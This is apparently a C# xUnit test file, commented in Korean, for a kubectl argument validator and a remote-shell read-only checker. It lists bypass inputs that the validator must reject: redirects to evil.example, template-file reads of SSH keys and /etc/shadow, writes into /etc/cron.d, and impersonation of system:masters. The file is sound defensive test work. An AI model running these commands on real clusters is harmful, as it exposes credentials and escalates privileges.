using System;
using System.Collections.Generic;
using Nubis;
using Xunit;

namespace Nubis.Tests;

/// <summary>
/// kubectl 인자 검사(run_kubectl · Kubernetes 페이지)와 원격 셸 kubectl 읽기 전용 판정의 우회 반례.
/// kubectl(cobra·pflag) 해석: 짧은 옵션 묶음(-As x), 긴 이름의 _ → -, 값 옵션 뒤의 -- 는 값, 첫 인자가 기본 명령이 아니면 플러그인 실행
/// </summary>
public class KubectlArgsTests
{
    private static List<string> A(string line) => KubectlArgs.Split(line);
    private static bool Sh(string c) => ReadOnlyCommands.IsReadOnly(c, CommandShell.Sh);

    // ---------------------------------------------------------------- 1. 짧은 옵션 묶음 속 -s

    [Theory]
    [InlineData("get pods -As https://evil.example")]
    [InlineData("get pods -Ashttps://evil.example")]
    [InlineData("get pods -As=https://evil.example")]
    [InlineData("get pods -ws https://evil.example")]
    [InlineData("get pods -is https://evil.example")]
    [InlineData("get pods -Rs https://evil.example")]
    [InlineData("get pods -wAs https://evil.example")]
    [InlineData("get pods -s=https://evil.example")]
    [InlineData("get pods -pfs https://evil.example")]
    [InlineData("logs web -fs https://evil.example")]
    [InlineData("-As https://evil.example get pods")]
    public void 짧은_옵션_묶음의_서버_바꾸기는_거부(string line)
    {
        Assert.NotNull(KubectlArgs.Validate(A(line)));
        Assert.False(KubectlArgs.IsReadOnly(A(line)));
        Assert.False(Sh("kubectl " + line));
    }

    [Theory]
    [InlineData("get pods -lapp=s", true)]
    [InlineData("get pods -nkube-system", true)]
    [InlineData("get pods -n kube-system -ojsonpath={.items[*].status}", true)]
    [InlineData("logs web -csidecar --tail=10", true)]
    [InlineData("get pods -Aowide", true)]
    [InlineData("exec web -it -- sh -s", false)]
    public void 값을_받는_짧은_옵션_뒤의_s_는_값이라_허용(string line, bool readOnly)
    {
        Assert.Null(KubectlArgs.Validate(A(line)));
        Assert.Equal(readOnly, KubectlArgs.IsReadOnly(A(line)));
    }

    // ---------------------------------------------------------------- 2. 로컬 파일 읽기·쓰기

    [Theory]
    [InlineData(@"get ns default -o go-template-file=C:\Users\me\.ssh\id_rsa")]
    [InlineData(@"get ns default -o=go-template-file=C:\Users\me\.ssh\id_rsa")]
    [InlineData(@"get ns default -ogo-template-file=C:\Users\me\.ssh\id_rsa")]
    [InlineData(@"get ns default -Aogo-template-file=C:\x")]
    [InlineData(@"get ns default -Ao go-template-file=C:\x")]
    [InlineData(@"get ns default --output go-template-file=C:\x")]
    [InlineData(@"get ns default --output=jsonpath-file=C:\x")]
    [InlineData(@"get ns default -o jsonpath-file=C:\x")]
    [InlineData(@"get ns default -o templatefile --template=C:\x")]
    [InlineData(@"get ns default -o custom-columns-file=C:\x")]
    [InlineData(@"get ns default -o GO-TEMPLATE-FILE=C:\x")]
    [InlineData(@"get pods --profile=heap --profile-output=C:\Users\me\AppData\Roaming\Nubis\hosts.json")]
    [InlineData(@"get pods --profile_output=C:\x")]
    [InlineData(@"get pods --profile=cpu")]
    [InlineData(@"get pods --profile heap")]
    [InlineData(@"get pods --log-file=C:\x")]
    [InlineData(@"get pods --log_file C:\x")]
    [InlineData(@"get pods --log-dir=C:\x")]
    [InlineData(@"get pods --kuberc=C:\x")]
    [InlineData(@"get pods --kuberc C:\x")]
    [InlineData(@"get pods --cache-dir=C:\x")]
    [InlineData(@"get pods --cache_dir=C:\x")]
    [InlineData(@"kustomize . --enable-helm --helm-command=C:\evil.exe")]
    [InlineData(@"kustomize . --enable-alpha-plugins")]
    [InlineData(@"kustomize . --enable_exec")]
    public void 로컬_파일을_읽거나_쓰는_옵션은_거부(string line)
    {
        Assert.NotNull(KubectlArgs.Validate(A(line)));
        Assert.False(KubectlArgs.IsReadOnly(A(line)));
    }

    [Theory]
    [InlineData("kubectl get ns default -o go-template-file=/root/.ssh/id_rsa")]
    [InlineData("kubectl get ns default -ogo-template-file=/root/.ssh/id_rsa")]
    [InlineData("kubectl get ns default -o=jsonpath-file=/etc/shadow")]
    [InlineData("kubectl get ns default --output jsonpath-file=/etc/shadow")]
    [InlineData("kubectl get ns -o templatefile --template=/etc/shadow")]
    [InlineData("kubectl get pods --profile=heap --profile-output=/etc/cron.d/x")]
    [InlineData("kubectl get pods --profile_output=/tmp/x")]
    [InlineData("kubectl get pods --log-file=/tmp/x")]
    [InlineData("kubectl get pods --log_dir=/tmp")]
    [InlineData("kubectl get pods --kuberc=/tmp/k")]
    [InlineData("kubectl get pods --cache_dir=/tmp/c")]
    [InlineData("kubectl get -f /etc/shadow")]
    [InlineData("kubectl get --filename=/etc/shadow")]
    [InlineData("kubectl get -Af /etc/shadow")]
    [InlineData("kubectl get -f https://evil.example/x.yaml")]
    [InlineData("kubectl get -k /tmp/dir")]
    [InlineData("kubectl describe -f x.yaml")]
    [InlineData("kubectl logs -k /tmp/dir")]
    public void 원격_셸의_로컬_파일_옵션은_자동_승인하지_않는다(string c) => Assert.False(Sh(c));

    // ---------------------------------------------------------------- 3. 값 옵션 뒤의 --

    [Theory]
    [InlineData("get pods -l -- --server=https://evil.example")]
    [InlineData("get pods -l -- --kubeconfig=C:\\x")]
    [InlineData("get pods --selector -- --token=abc")]
    [InlineData("get pods -n -- -s https://evil.example")]
    [InlineData("get pods -Al -- --server=https://evil.example")]
    [InlineData("get pods --unknown-flag -- --server=https://evil.example")]
    [InlineData("exec web -c -- --server=https://evil.example -- sh")]
    [InlineData("exec web --container -- --kubeconfig=C:\\x -- sh")]
    [InlineData("get pods -o -- -o go-template-file=C:\\x")]
    public void 값_옵션이_가져간_대시_두개_뒤도_검사한다(string line)
    {
        Assert.NotNull(KubectlArgs.Validate(A(line)));
        Assert.False(KubectlArgs.IsReadOnly(A(line)));
        Assert.False(Sh("kubectl " + line));
    }

    [Theory]
    [InlineData("exec web -- sh -s")]
    [InlineData("exec web -it -- sh -c 'curl -s http://x'")]
    [InlineData("exec web -c app -- sh -s")]
    [InlineData("exec web --container app -i -t -- sh -s")]
    [InlineData("exec web --stdin --tty -- sh -s")]
    [InlineData("exec web --container=app -- sh -s")]
    [InlineData("run t --image=busybox --rm -it --restart=Never -- sh -c 'wget -s'")]
    [InlineData("debug node/n1 -it --image=busybox --profile=sysadmin -- chroot /host")]
    [InlineData("create job j --image=busybox -- date -s now")]
    public void 끝_표시_뒤의_컨테이너_명령은_검사하지_않는다(string line)
    {
        Assert.Null(KubectlArgs.Validate(A(line)));
        Assert.False(KubectlArgs.IsReadOnly(A(line)));
    }

    // ---------------------------------------------------------------- 그 밖의 우회

    [Theory]
    [InlineData("krew install evil")]
    [InlineData("evil-plugin")]
    [InlineData("foo get pods")]
    [InlineData("create foo")]
    [InlineData("create evilthing --x")]
    [InlineData("get pods --tls_server_name=evil")]
    [InlineData("get pods --insecure_skip_tls_verify -s https://evil.example")]
    [InlineData("get pods --client_certificate=C:\\x")]
    [InlineData("get pods --as_group=system:masters")]
    [InlineData("get pods --as_uid=0")]
    [InlineData("get pods --Server=https://evil.example")]
    [InlineData("get pods --KUBECONFIG=C:\\x")]
    [InlineData("get pods --kubecon=C:\\x")]
    [InlineData("get pods --token=abc")]
    [InlineData("get pods --context=other")]
    [InlineData("get pods --cluster other")]
    [InlineData("get pods --user=admin")]
    [InlineData("get pods --username=admin")]
    [InlineData("get pods --password=x")]
    public void 플러그인과_표기만_바꾼_차단_옵션은_거부(string line)
    {
        Assert.NotNull(KubectlArgs.Validate(A(line)));
        Assert.False(KubectlArgs.IsReadOnly(A(line)));
    }

    [Theory]
    [InlineData("kubectl krew list")]
    [InlineData("kubectl evil-plugin get")]
    [InlineData("kubectl get pods --tls_server_name=evil")]
    [InlineData("kubectl get pods --token=abc")]
    [InlineData("kubectl get pods --as=system:admin")]
    [InlineData("kubectl get pods --as_group=system:masters")]
    [InlineData("kubectl get pods --client-key=/root/k")]
    [InlineData("kubectl get pods --insecure_skip_tls_verify")]
    [InlineData("kubectl get pods -- -s x")]
    [InlineData("kubectl get --raw=/api")]
    [InlineData("kubectl cluster-info dump --output_directory=/tmp/x")]
    [InlineData("KUBECONFIG=/tmp/k kubectl get pods")]
    [InlineData("KUBERC=/tmp/r kubectl get pods")]
    [InlineData("env KUBECONFIG=/tmp/k kubectl get pods")]
    [InlineData("kubectl get pods -As https://evil.example")]
    [InlineData("kubectl get pods -Ashttps://evil.example")]
    public void 원격_셸_kubectl_우회도_자동_승인하지_않는다(string c) => Assert.False(Sh(c));

    [Theory]
    [InlineData("kubectl --context prod get pods")]
    [InlineData("kubectl get pods --context=prod -n x")]
    [InlineData("kubectl get pods -A -o wide")]
    [InlineData("kubectl get pods -lapp=web -o 'jsonpath={.items[*].metadata.name}'")]
    [InlineData("kubectl logs -f web --tail=10")]
    [InlineData("kubectl get pods -o go-template '--template={{.kind}}'")]
    [InlineData("kubectl get pods -o custom-columns=NAME:.metadata.name")]
    public void 원격_셸의_평범한_조회는_계속_자동_승인(string c) => Assert.True(Sh(c));

    [Theory]
    [InlineData("get pods -o go-template --template={{.kind}}", true)]
    [InlineData("get pods -o custom-columns=NAME:.metadata.name", true)]
    [InlineData("get pods --sort-by=.metadata.name", true)]
    [InlineData("apply --server-side -f x.yaml", false)]
    [InlineData("create deployment web --image=nginx", false)]
    [InlineData("create cm x --from-literal=a=b", false)]
    [InlineData("plugin list", false)]
    [InlineData("debug web -it --image=busybox --profile=general", false)]
    public void 기본_명령과_평범한_옵션은_허용(string line, bool readOnly)
    {
        Assert.Null(KubectlArgs.Validate(A(line)));
        Assert.Equal(readOnly, KubectlArgs.IsReadOnly(A(line)));
    }

    [Fact]
    public void 끝_표시_위치는_pflag_와_같다()
    {
        Assert.Equal(2, KubectlArgs.TerminatorIndex(new[] { "exec", "web", "--", "sh" }));
        Assert.Equal(3, KubectlArgs.TerminatorIndex(new[] { "exec", "web", "-it", "--", "sh" }));
        Assert.Equal(4, KubectlArgs.TerminatorIndex(new[] { "exec", "web", "-c", "app", "--", "sh" }));
        Assert.Equal(5, KubectlArgs.TerminatorIndex(new[] { "get", "pods", "-l", "--", "x", "--", "y" }));   // 첫 -- 는 -l 의 값
        Assert.Equal(4, KubectlArgs.TerminatorIndex(new[] { "get", "pods", "-l", "--" }));                    // 끝 표시 없음
        Assert.Equal(3, KubectlArgs.TerminatorIndex(new[] { "exec", "web", "-c=app", "--", "sh" }));
    }
}
